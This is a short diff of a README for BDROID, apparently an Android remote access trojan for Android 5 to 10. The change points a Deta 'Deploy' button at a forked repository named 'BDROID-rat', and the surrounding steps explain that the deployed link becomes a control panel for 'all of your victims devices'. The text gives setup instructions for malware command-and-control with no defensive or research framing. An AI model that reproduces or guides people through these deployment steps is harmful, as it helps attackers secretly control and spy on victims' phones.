@@ -36,7 +36,7 @@ Android 5 to Android 10. Working Without Any Error.
 * Create a New Account here [Deta.sh](https://deta.sh)
 
 * Now Deploy To Deta : 
-[![Deploy](https://button.deta.dev/1/svg)](https://go.deta.dev/deploy?repo=https://github.com/BotolMehedi/BDROID)
+[![Deploy](https://button.deta.dev/1/svg)](https://go.deta.dev/deploy?repo=https://github.com/alvinbaby/BDROID-rat)
 
 * After Successfully Deployed, Copy That Link. This is Your Control Panel. You Can Control All of Your Victims Devices From Here.
 <a href="https://github.com/alvinbaby/BDROID-rat"><img title="BDROID" src="https://user-images.githubusercontent.com/64999484/160270463-cd7a4097-ee08-4181-b3d3-b91e2190c6e7.png"></a>
